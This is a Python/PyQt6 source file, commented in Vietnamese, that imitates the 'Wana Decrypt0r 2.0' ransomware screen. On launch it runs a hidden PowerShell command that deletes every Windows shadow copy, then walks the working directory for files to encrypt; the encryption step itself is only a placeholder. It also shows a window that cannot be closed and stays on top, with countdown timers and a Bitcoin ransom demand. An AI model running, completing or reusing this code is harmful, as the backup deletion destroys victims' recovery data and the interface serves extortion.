import sys
import os
import threading
import time
import struct
import subprocess
from pathlib import Path
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QLabel, QVBoxLayout, 
                             QHBoxLayout, QFrame, QTextEdit, QLineEdit, QPushButton, 
                             QGroupBox, QFileDialog, QMessageBox)
from PyQt6.QtCore import QTimer, QTime, Qt, QMetaObject, Q_ARG
from PyQt6.QtGui import QPixmap, QCloseEvent

# --- Metadata Structure (Để giải mã sau này) ---
# Trong Python, chúng ta sử dụng module 'struct' để giả lập packed struct của C++
# SecureMetadata: aes_key[32], gcm_nonce[12], gcm_tag[16], original_size (uint32)
SECURE_METADATA_FORMAT = "<32s12s16sI" 

const_UNLOCK_KEY = "PENTA-DECRYPT-2026"
const_FILE_ANH = "logo.png"

# --- Core Helper Functions ---

def xoa_shadow_copies():
    # Sử dụng subprocess để thực thi lệnh powershell tương đương WinExec
    cmd = "powershell -NoP -W Hidden -Command \"Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }\""
    try:
        # SW_HIDE được giả lập bằng cách không tạo cửa sổ console trên Windows
        subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
    except Exception as e:
        print(f"Lỗi khi xóa shadow copies: {e}")

# --- Main Interface Class ---

class WannaCryInterface(QMainWindow):
    # Q_OBJECT trong C++ được PyQt tự động xử lý khi kế thừa QMainWindow

    def __init__(self):
        super().__init__()
        self.timer1 = None
        self.timer2 = None
        self.txt = None
        self.key_entry = None
        
        self.setupUI()
        
        # Chạy Evasion và Encryption ngầm khi mở app (tương đương std::thread(...).detach())
        threading.Thread(target=self.background_tasks, daemon=True).start()

    def background_tasks(self):
        xoa_shadow_copies()
        self.thuc_thi_ma_hoa_thu_muc()
        # Trong Python, dùng signal/slot hoặc lambda sẽ chuẩn hơn invokeMethod
        QTimer.singleShot(0, self.updateStatus)

    def updateStatus(self):
        # Placeholder cho phương thức được gọi từ invokeMethod trong code gốc
        pass

    def closeEvent(self, event: QCloseEvent):
        event.ignore() # Không cho đóng cửa sổ

    def setupUI(self):
        self.setWindowTitle("Wana Decrypt0r 2.0")
        self.setFixedSize(800, 600)
        # WindowStaysOnTopHint tương đương với Qt::WindowStaysOnTopHint
        self.setWindowFlags(self.windowFlags() | Qt.WindowType.WindowStaysOnTopHint)
        self.setStyleSheet("background-color: #841414; border: none;")

        centralWidget = QWidget(self)
        self.setCentralWidget(centralWidget)
        mainVerticalLayout = QVBoxLayout(centralWidget)

        headerLabel = QLabel("Ooops, your files have been encrypted!", self)
        headerLabel.setStyleSheet("color: white; font-family: 'Segoe UI'; font-size: 20pt; font-weight: bold;")
        headerLabel.setAlignment(Qt.AlignmentFlag.AlignCenter)
        mainVerticalLayout.addWidget(headerLabel)

        mainFrame = QFrame(self)
        mainHorizontalLayout = QHBoxLayout(mainFrame)
        mainVerticalLayout.addWidget(mainFrame, 1)

        # Panel trái: Hình ảnh & Timers
        leftPnl = QWidget(mainFrame)
        leftPnl.setFixedWidth(220)
        leftLayout = QVBoxLayout(leftPnl)
        mainHorizontalLayout.addWidget(leftPnl)

        if Path(const_FILE_ANH).exists():
            img = QPixmap(const_FILE_ANH)
            imgLabel = QLabel(leftPnl)
            imgLabel.setPixmap(img.scaled(180, 180, Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation))
            leftLayout.addWidget(imgLabel, 0, Qt.AlignmentFlag.AlignCenter)

        self.timer1 = self.create_timer_box(leftPnl, "Payment will be raised on")
        self.timer2 = self.create_timer_box(leftPnl, "Your files will be lost on")
        leftLayout.addStretch()

        # Panel phải: Nội dung văn bản
        rightPnl = QFrame(mainFrame)
        rightPnl.setStyleSheet("background-color: white; border: 1px solid gray;")
        rightLayout = QVBoxLayout(rightPnl)
        mainHorizontalLayout.addWidget(rightPnl, 1)

        self.txt = QTextEdit(rightPnl)
        self.txt.setReadOnly(True)
        self.txt.setStyleSheet("color: black; font-family: 'Segoe UI'; font-size: 10pt; border: none;")
        self.txt.setPlainText((r"""[+] Chuyện gì đã xảy ra với máy tính của tôi?
Các tệp quan trọng của bạn đã bị mã hóa. Nhiều tệp tài liệu, ảnh, video, cơ sở dữ liệu và các tệp khác của bạn không còn có thể truy cập được vì chúng đã bị mã hóa. Có lẽ bạn đang bận rộn tìm cách phục hồi các tệp của mình, nhưng đừng lãng phí thời gian. Không ai có thể phục hồi các tệp của bạn nếu không có dịch vụ giải mã của chúng tôi.

[+] Tôi có thể phục hồi các tệp của mình không?
Chắc chắn rồi. Chúng tôi đảm bảo rằng bạn có thể khôi phục tất cả các tệp của mình một cách an toàn và dễ dàng. Nhưng bạn không có đủ thời gian.
Bạn có thể giải mã miễn phí một số tệp để kiểm tra. Hãy thử ngay bằng cách nhấp vào <Decrypt>.
Nhưng nếu bạn muốn giải mã tất cả các tệp, bạn cần phải thanh toán. Bạn chỉ có 3 ngày để gửi khoản thanh toán. Sau đó, giá sẽ tăng gấp đôi. Ngoài ra, nếu bạn không thanh toán trong 7 ngày, bạn sẽ không thể khôi phục các tệp của mình mãi mãi.

[+] Tôi phải thanh toán như thế nào?
Việc thanh toán chỉ được chấp nhận bằng Bitcoin. Để biết thêm thông tin, hãy nhấp vào <About bitcoin>.
Vui lòng kiểm tra giá Bitcoin hiện tại và mua một ít bitcoin. 
Gửi số tiền chính xác được chỉ định trong cửa sổ này đến địa chỉ ví bên dưới.
Sau khi thanh toán, hãy nhấp vào <Check Payment>. Thời gian kiểm tra tốt nhất: 9:00 sáng - 11:00 sáng hàng ngày.

[+] Nếu bạn đã có key giải mã, làm thế nào để sử dụng nó?
1. Nhập mã UNLOCK_KEY vào ô bên dưới.
2. Hệ thống sẽ yêu cầu bạn chọn file 'private_key.pem'.
3. Nhấn Decrypt để khôi phục dữ liệu.

.__           .__       .__                            .__                   __                    __                         
|  |__ _____  |__|_____ |  |__   ____   ____    ____   |  |__ _____    ____ |  | __ ___________  _/  |_  ____ _____    _____  
|  |  \\__  \ |  \____ \|  |  \ /  _ \ /    \  / ___\  |  |  \\__  \ _/ ___\|  |/ // __ \_  __ \ \   __\/ __ \\__  \  /     \ 
|   Y  \/ __ \|  |  |_> >   Y  (  <_> )   |  \/ /_/  > |   Y  \/ __ \\  \___|    <\  ___/|  | \/  |  | \  ___/ / __ \|  Y Y  \
|___|  (____  /__|   __/|___|  /\____/|___|  /\___  /  |___|  (____  /\___  >__|_ \\___  >__|     |__|  \___  >____  /__|_|  /
     \/     \/   |__|        \/            \//_____/        \/     \/     \/     \/    \/                   \/     \/      \/ 
"""))
        rightLayout.addWidget(self.txt)

        # Footer: Nhập key & Nút giải mã
        footer = QWidget(self)
        footer.setFixedHeight(60)
        footerLayout = QHBoxLayout(footer)
        self.key_entry = QLineEdit(footer)
        self.key_entry.setPlaceholderText(" Nhập UNLOCK_KEY tại đây...")
        self.key_entry.setStyleSheet("background-color: white; color: black; border: 1px solid gray; height: 30px;")
        
        decryptBtn = QPushButton("Decrypt", footer)
        decryptBtn.setStyleSheet("background-color: #e1e1e1; color: black; font-weight: bold; width: 100px; height: 30px;")
        
        footerLayout.addWidget(self.key_entry)
        footerLayout.addWidget(decryptBtn)
        mainVerticalLayout.addWidget(footer)

        decryptBtn.clicked.connect(self.handle_decrypt)

        timer = QTimer(self)
        timer.timeout.connect(self.update_clock)
        timer.start(1000)

    def create_timer_box(self, parent, title):
        box = QGroupBox(title, parent)
        box.setStyleSheet("QGroupBox { color: yellow; font-weight: bold; border: 1px solid yellow; margin-top: 15px; }")
        layout = QVBoxLayout(box)
        lbl = QLabel("00:00:00", box)
        lbl.setStyleSheet("color: white; font-family: 'Courier'; font-size: 14pt; font-weight: bold;")
        lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(lbl)
        parent.layout().addWidget(box)
        return lbl

    def update_clock(self):
        t = QTime.currentTime().toString("hh:mm:ss")
        self.timer1.setText("02:" + t)
        self.timer2.setText("06:" + t)

    def thuc_thi_ma_hoa_thu_muc(self):
        # Logic giả định quét thư mục hiện tại (tương đương recursive_directory_iterator)
        current_path = Path.cwd()
        for path in current_path.rglob('*'):
            if path.is_file() and path.suffix != ".alxvrus":
                # Ở đây sẽ gọi hàm mã hóa chuyên nghiệp
                pass

    def handle_decrypt(self):
        if self.key_entry.text().strip() == const_UNLOCK_KEY:
            file_path, _ = QFileDialog.getOpenFileName(self, "Chọn file Private Key", "", "PEM files (*.pem)")
            if not file_path:
                return

            self.key_entry.setEnabled(False)
            self.key_entry.setText("PROCESSING...")

            def decryption_thread():
                time.sleep(2)
                # Cách an toàn nhất trong PyQt6 để gọi hàm UI từ thread khác:
                QTimer.singleShot(0, self.finish_decryption)

            threading.Thread(target=decryption_thread, daemon=True).start()
        else:
            QMessageBox.critical(self, "Error", "SAI MÃ UNLOCK KEY!")

    @QMetaObject.pyqtSlot()
    def finish_decryption(self):
        QMessageBox.information(self, "Success", "Dữ liệu đã được khôi phục thành công!")
        QApplication.quit()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = WannaCryInterface()
    window.show()
    sys.exit(app.exec())

# main.moc không cần thiết trong Python/PyQt
